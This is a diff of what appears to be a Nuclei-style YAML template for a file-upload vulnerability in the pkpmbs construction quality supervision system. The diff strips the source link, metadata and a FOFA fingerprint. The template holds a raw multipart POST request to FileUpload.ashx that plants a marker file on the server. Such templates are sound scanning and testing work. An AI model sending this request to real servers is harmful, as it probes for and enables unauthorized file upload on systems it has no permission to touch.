@@ -3,12 +3,8 @@ info:
   name: pkpmbs 建设工程质量监督系统 FileUpload.ashx 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zee37wzmqtae38oq'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zee37wzmqtae38oq
-    fofa: icon_hash="2001627082"
 http:
 - raw:
   - 'POST /Platform/System/FileUpload.ashx HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Content-Type: multipart/form-data; boundary=----YsOxWxSvj1KyZow1PTsh98fdu6l
 
 
-
-
     ------YsOxWxSvj1KyZow1PTsh98fdu6l
 
 
@@ -34,8 +28,6 @@ http:
     Content-Type: image/png
 
 
-
-
     dudesuite
 
 
@@ -43,8 +35,6 @@ http:
 
 
     Content-Disposition: form-data; name="target"
-
-
 
 
     /Applications/SkillDevelopAndEHS/
